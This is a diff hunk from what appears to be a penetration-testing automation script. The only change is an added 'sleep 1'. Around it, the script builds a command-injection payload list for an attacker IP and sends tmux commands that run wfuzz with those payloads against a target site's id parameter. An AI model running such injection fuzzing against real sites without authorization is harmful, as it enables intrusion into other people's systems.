@@ -1190,6 +1190,7 @@ cd $folderProjectEngine
 python ./cmdGenerator.py $attackerIP cmdlist.txt
 mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
 cd $folderProjectWebAuthN
+sleep 1
 tmux send-keys -t PT:1.4"# command injection automation (GET)" Enter
 tmux send-keys -t PT:1.4 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
 tmux send-keys -t PT:1.5 "# command injection automation (POST)" Enter
